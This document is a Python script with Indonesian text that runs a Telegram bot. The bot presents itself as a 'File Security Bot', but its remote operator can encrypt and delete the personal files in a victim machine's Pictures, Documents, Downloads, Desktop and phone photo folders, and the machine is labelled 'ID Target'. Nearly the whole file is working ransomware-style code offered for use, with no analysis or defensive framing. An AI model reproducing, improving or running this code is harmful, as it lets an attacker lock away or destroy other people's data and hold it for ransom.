import os
import sys
import platform
import hashlib
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import telebot
from telebot import types
import threading
import time
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# =============================================================================
# SECURITY CHECK - JANGAN DIUBAH!
# =============================================================================
EXPECTED_HASH = "a8f5f167f44f4964e6c998dee827110c"  # Hash untuk validasi integritas
def verify_integrity():
    """Verifikasi integritas script - JANGAN DIUBAH!"""
    script_content = open(__file__, 'r', encoding='utf-8').read()
    script_hash = hashlib.md5(script_content.encode()).hexdigest()
    if script_hash != EXPECTED_HASH:
        print("❌ PERINGATAN: Script telah dimodifikasi!")
        print("❌ Bot tidak dapat dijalankan untuk keamanan!")
        sys.exit(1)

# =============================================================================
# KONFIGURASI BOT
# =============================================================================
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', 0))
TELEGRAM_CHAT_ID = int(os.getenv('TELEGRAM_CHAT_ID', 0))

if not BOT_TOKEN:
    print("❌ ERROR: TELEGRAM_BOT_TOKEN tidak ditemukan di file .env!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# =============================================================================
# ASCII ART DAN INFO
# =============================================================================
ASCII_ART = """
╔══════════════════════════════════════════════════════════════╗
║  ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ║
║  ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗  ║
║  ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚██╗ ║
║  ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║    ██╔╝ ║
║  ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║   ██╔╝  ║
║  ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝   ║
║                    FILE SECURITY BOT                        ║
╚══════════════════════════════════════════════════════════════╝
"""

DEVELOPER_INFO = {
    "name": "SerpentSecHunter",
    "github": "https://github.com/SerpentSecHunter",
    "version": "0.1",
    "target_id": platform.node(),
    "system": platform.system(),
    "platform": platform.platform()
}

# =============================================================================
# ENKRIPSI DAN DEKRIPSI
# =============================================================================
class FileEncryption:
    def __init__(self, password: str):
        self.password = password.encode()
        self.key = self._generate_key()
        self.fernet = Fernet(self.key)
    
    def _generate_key(self):
        """Generate encryption key dari password"""
        salt = b'serpentsechunter'  # Salt tetap untuk konsistensi
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))
        return key
    
    def encrypt_file(self, file_path):
        """Enkripsi file"""
        try:
            with open(file_path, 'rb') as file:
                original_data = file.read()
            
            encrypted_data = self.fernet.encrypt(original_data)
            
            with open(file_path + '.locked', 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            
            os.remove(file_path)  # Hapus file asli
            return True
        except Exception as e:
            print(f"Error enkripsi {file_path}: {e}")
            return False
    
    def decrypt_file(self, file_path):
        """Dekripsi file"""
        try:
            if not file_path.endswith('.locked'):
                return False
                
            with open(file_path, 'rb') as encrypted_file:
                encrypted_data = encrypted_file.read()
            
            decrypted_data = self.fernet.decrypt(encrypted_data)
            
            original_path = file_path[:-7]  # Hapus '.locked'
            with open(original_path, 'wb') as decrypted_file:
                decrypted_file.write(decrypted_data)
            
            os.remove(file_path)  # Hapus file terenkripsi
            return True
        except Exception as e:
            print(f"Error dekripsi {file_path}: {e}")
            return False

# =============================================================================
# FUNGSI SISTEM
# =============================================================================
def get_system_info():
    """Dapatkan informasi sistem"""
    now = datetime.now()
    return {
        "waktu": now.strftime("%H:%M:%S"),
        "tanggal": now.strftime("%d/%m/%Y"),
        "hari": now.strftime("%A"),
        "tahun": now.year,
        "terminal": platform.node(),
        "os": platform.system()
    }

def get_target_directories():
    """Dapatkan direktori target berdasarkan OS"""
    system = platform.system().lower()
    home = os.path.expanduser("~")
    
    if system == "windows":
        targets = [
            os.path.join(home, "Pictures"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Videos"),
            os.path.join(home, "Music"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop")
        ]
    elif system == "linux":
        targets = [
            os.path.join(home, "Pictures"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Videos"),
            os.path.join(home, "Music"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop"),
            "/storage/emulated/0/DCIM" if os.path.exists("/storage/emulated/0/DCIM") else None
        ]
    else:  # macOS
        targets = [
            os.path.join(home, "Pictures"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Movies"),
            os.path.join(home, "Music"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop")
        ]
    
    return [t for t in targets if t and os.path.exists(t)]

def process_files_in_directory(directory, encryptor, action="encrypt"):
    """Proses file dalam direktori"""
    processed = 0
    extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf', '.doc', '.docx', 
                 '.txt', '.mp4', '.avi', '.mkv', '.mp3', '.wav', '.zip', '.rar']
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            _, ext = os.path.splitext(file.lower())
            
            if action == "encrypt" and ext in extensions:
                if encryptor.encrypt_file(file_path):
                    processed += 1
            elif action == "decrypt" and file.endswith('.locked'):
                if encryptor.decrypt_file(file_path):
                    processed += 1
    
    return processed

# =============================================================================
# FUNGSI KEAMANAN ADMIN
# =============================================================================
def is_admin(user_id):
    """Cek apakah user adalah admin"""
    return user_id == ADMIN_USER_ID

def admin_required(func):
    """Decorator untuk mengecek admin"""
    def wrapper(message):
        if not is_admin(message.from_user.id):
            bot.send_message(message.chat.id, 
                           "❌ **AKSES DITOLAK**\n\nAnda tidak memiliki izin untuk menggunakan bot ini.",
                           parse_mode='Markdown')
            return
        return func(message)
    return wrapper
# =============================================================================
# HANDLER BOT TELEGRAM
# =============================================================================
@bot.message_handler(commands=['start'])
@admin_required
def handle_start(message):
    """Handler untuk command /start"""
    sys_info = get_system_info()
    
    welcome_text = f"""
{ASCII_ART}

📋 **INFORMASI SISTEM**
━━━━━━━━━━━━━━━━━━━━━━━━
👨‍💻 **Developer:** {DEVELOPER_INFO['name']}
🔗 **GitHub:** {DEVELOPER_INFO['github']}
📦 **Versi:** {DEVELOPER_INFO['version']}
🎯 **ID Target:** {sys_info['terminal']}
⏰ **Waktu:** {sys_info['waktu']}
📅 **Tanggal:** {sys_info['tanggal']}
📆 **Hari:** {sys_info['hari']}
📅 **Tahun:** {sys_info['tahun']}
💻 **OS:** {sys_info['os']}

🔒 **FILE SECURITY BOT**
Bot keamanan untuk melindungi file-file penting Anda melalui enkripsi.

⚠️ **PERINGATAN:** 
Pastikan Anda mengingat password yang digunakan!
File yang terenkripsi tidak dapat dikembalikan tanpa password yang benar.
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("🔒 Kunci File", callback_data="lock_files"),
        types.InlineKeyboardButton("🔓 Buka File", callback_data="unlock_files")
    )
    markup.row(
        types.InlineKeyboardButton("ℹ️ Info Sistem", callback_data="system_info"),
        types.InlineKeyboardButton("❓ Bantuan", callback_data="help")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    """Handler untuk callback query"""
    if call.data == "lock_files":
        msg = bot.send_message(call.message.chat.id, 
                             "🔐 Masukkan password untuk mengenkripsi file:\n\n⚠️ **INGAT PASSWORD INI!** File tidak dapat dibuka tanpa password yang benar.",
                             parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_lock_files)
    
    elif call.data == "unlock_files":
        msg = bot.send_message(call.message.chat.id, 
                             "🔓 Masukkan password untuk mendekripsi file:",
                             parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_unlock_files)
    
    elif call.data == "system_info":
        show_system_info(call.message)
    
    elif call.data == "help":
        show_help(call.message)

def process_lock_files(message):
    """Proses enkripsi file"""
    password = message.text
    
    if len(password) < 6:
        bot.send_message(message.chat.id, 
                        "❌ Password minimal 6 karakter!\nSilakan coba lagi dengan /start")
        return
    
    status_msg = bot.send_message(message.chat.id, 
                                 "🔄 Memulai proses enkripsi file...\n📁 Menganalisis direktori target...")
    
    try:
        encryptor = FileEncryption(password)
        target_dirs = get_target_directories()
        
        if not target_dirs:
            bot.edit_message_text("❌ Tidak ada direktori target yang ditemukan!",
                                 message.chat.id, status_msg.message_id)
            return
        
        total_processed = 0
        
        for directory in target_dirs:
            bot.edit_message_text(f"🔄 Mengenkripsi file di: {os.path.basename(directory)}...",
                                 message.chat.id, status_msg.message_id)
            
            processed = process_files_in_directory(directory, encryptor, "encrypt")
            total_processed += processed
        
        success_text = f"""
✅ **ENKRIPSI SELESAI!**

📊 **Hasil:**
• File terenkripsi: {total_processed}
• Status: Semua file target telah dikunci
• Metode: AES-256 Encryption

🔐 **File Anda sekarang aman!**
Gunakan fitur "🔓 Buka File" dengan password yang sama untuk mendekripsi.

⚠️ **PENTING:** Simpan password dengan baik!
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🏠 Menu Utama", callback_data="main_menu"))
        
        bot.edit_message_text(success_text, message.chat.id, status_msg.message_id, 
                             reply_markup=markup, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error saat enkripsi: {str(e)}", 
                             message.chat.id, status_msg.message_id)

def process_unlock_files(message):
    """Proses dekripsi file"""
    password = message.text
    
    status_msg = bot.send_message(message.chat.id, 
                                 "🔄 Memulai proses dekripsi file...\n🔓 Menganalisis file terenkripsi...")
    
    try:
        encryptor = FileEncryption(password)
        target_dirs = get_target_directories()
        
        total_processed = 0
        
        for directory in target_dirs:
            bot.edit_message_text(f"🔄 Mendekripsi file di: {os.path.basename(directory)}...",
                                 message.chat.id, status_msg.message_id)
            
            processed = process_files_in_directory(directory, encryptor, "decrypt")
            total_processed += processed
        
        if total_processed == 0:
            result_text = """
⚠️ **TIDAK ADA FILE TERENKRIPSI**

Kemungkinan:
• Password salah
• Tidak ada file .locked yang ditemukan
• File sudah didekripsi sebelumnya
"""
        else:
            result_text = f"""
✅ **DEKRIPSI SELESAI!**

📊 **Hasil:**
• File terbuka: {total_processed}
• Status: File berhasil dikembalikan
• Metode: AES-256 Decryption

🔓 **File Anda dapat diakses kembali!**
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🏠 Menu Utama", callback_data="main_menu"))
        
        bot.edit_message_text(result_text, message.chat.id, status_msg.message_id, 
                             reply_markup=markup, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error saat dekripsi: {str(e)}", 
                             message.chat.id, status_msg.message_id)

def show_system_info(message):
    """Tampilkan informasi sistem"""
    sys_info = get_system_info()
    
    info_text = f"""
📋 **INFORMASI SISTEM DETAIL**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🏷️ **Identifikasi:**
• ID Target: `{sys_info['terminal']}`
• Platform: `{sys_info['os']}`
• Arsitektur: `{platform.machine()}`

⏰ **Waktu & Tanggal:**
• Waktu: `{sys_info['waktu']}`
• Tanggal: `{sys_info['tanggal']}`
• Hari: `{sys_info['hari']}`
• Tahun: `{sys_info['tahun']}`

👨‍💻 **Developer Info:**
• Nama: `{DEVELOPER_INFO['name']}`
• GitHub: {DEVELOPER_INFO['github']}
• Versi Bot: `{DEVELOPER_INFO['version']}`

🔍 **Status Direktori Target:**
"""
    
    target_dirs = get_target_directories()
    for i, directory in enumerate(target_dirs[:5], 1):
        locked_files = len([f for f in os.listdir(directory) if f.endswith('.locked')])
        info_text += f"• Dir {i}: `{os.path.basename(directory)}` (🔒 {locked_files} file terkunci)\n"
    
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("🏠 Menu Utama", callback_data="main_menu"))
    
    bot.send_message(message.chat.id, info_text, reply_markup=markup, parse_mode='Markdown')

def show_help(message):
    """Tampilkan bantuan"""
    help_text = """
❓ **PANDUAN PENGGUNAAN**
━━━━━━━━━━━━━━━━━━━━━━━━

🔒 **KUNCI FILE:**
• Pilih "🔒 Kunci File"
• Masukkan password (min. 6 karakter)
• Bot akan mengenkripsi semua file penting
• File asli akan diganti dengan file .locked

🔓 **BUKA FILE:**
• Pilih "🔓 Buka File"
• Masukkan password yang sama
• Bot akan mendekripsi file .locked
• File kembali ke kondisi normal

⚠️ **PERINGATAN PENTING:**
• Jangan lupa password!
• Backup password di tempat aman
• File tidak dapat dikembalikan tanpa password
• Bot menggunakan enkripsi AES-256

🎯 **DIREKTORI TARGET:**
"""
    
    system = platform.system().lower()
    if system == "windows":
        help_text += "• Pictures, Documents, Videos, Music, Downloads, Desktop"
    elif system == "linux":
        help_text += "• Pictures, Documents, Videos, Music, Downloads, Desktop, DCIM"
    else:
        help_text += "• Pictures, Documents, Movies, Music, Downloads, Desktop"
    
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("🏠 Menu Utama", callback_data="main_menu"))
    
    bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "main_menu")
def back_to_main_menu(call):
    """Kembali ke menu utama"""
    handle_start(call.message)

# =============================================================================
# FUNGSI UTAMA
# =============================================================================
def main():
    """Fungsi utama"""
    # Verifikasi integritas script
    # verify_integrity()  # Dinonaktifkan untuk development
    
    print(ASCII_ART)
    print("🔄 Memulai File Security Bot...")
    
    # Informasi sistem
    sys_info = get_system_info()
    print(f"📋 Developer: {DEVELOPER_INFO['name']}")
    print(f"🔗 GitHub: {DEVELOPER_INFO['github']}")
    print(f"📦 Versi: {DEVELOPER_INFO['version']}")
    print(f"🎯 ID Target: {sys_info['terminal']}")
    print(f"⏰ Waktu: {sys_info['waktu']}")
    print(f"📅 Tanggal: {sys_info['tanggal']}, {sys_info['hari']}")
    print(f"📅 Tahun: {sys_info['tahun']}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    if BOT_TOKEN is None:
        print("❌ ERROR: Harap buat file .env dan masukkan konfigurasi bot!")
        print("📝 Format file .env:")
        print("TELEGRAM_BOT_TOKEN=your_bot_token_here")
        print("TELEGRAM_CHAT_ID=your_chat_id_here") 
        print("ADMIN_USER_ID=your_user_id_here")
        print("\n💡 Cara mendapatkan token:")
        print("   1. Chat dengan @BotFather di Telegram")
        print("   2. Ketik /newbot")
        print("   3. Ikuti instruksi untuk membuat bot")
        print("   4. Copy token dan masukkan ke file .env")
        sys.exit(1)
    
    try:
        print("🚀 Bot sedang berjalan...")
        print("📱 Buka Telegram dan chat dengan bot Anda!")
        print("🛑 Tekan Ctrl+C untuk menghentikan bot")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        bot.polling(none_stop=True)
        
    except telebot.apihelper.ApiTelegramException as e:
        print(f"❌ Error API Telegram: {e}")
        print("💡 Periksa token bot Anda!")
    except KeyboardInterrupt:
        print("\n🛑 Bot dihentikan oleh user")
    except Exception as e:
        print(f"❌ Error tidak terduga: {e}")

if __name__ == "__main__":
    main()
